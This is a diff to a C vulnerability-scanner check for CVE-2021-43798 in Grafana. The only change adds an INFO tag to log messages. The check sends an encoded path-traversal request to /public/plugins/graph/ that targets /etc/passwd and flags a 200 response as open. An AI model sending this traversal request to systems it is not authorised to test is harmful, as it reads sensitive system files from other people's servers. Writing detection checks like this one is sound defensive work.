@@ -12,10 +12,10 @@ int almap_script_run(AlScriptContext *ctx) {
     }
     n = ar_http_get(ctx, "/public/plugins/graph/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", resp, sizeof(resp));
     if (n <= 0) {
-        ar_out(ctx, "grafana-check-cve2021-43798-4: no HTTP response on port %d", ctx->port);
+        ar_out(ctx, "grafana-check-cve2021-43798-4: INFO no HTTP response on port %d", ctx->port);
         return 0;
     }
-    ar_out(ctx, "grafana-check-cve2021-43798-4: GET /public/plugins/graph/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd [%d]%s", ar_http_status(resp),
+    ar_out(ctx, "grafana-check-cve2021-43798-4: INFO GET /public/plugins/graph/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd [%d]%s", ar_http_status(resp),
            (ar_http_status(resp) == 200) ? " (open; verify)" : "");
     return 0;
 }
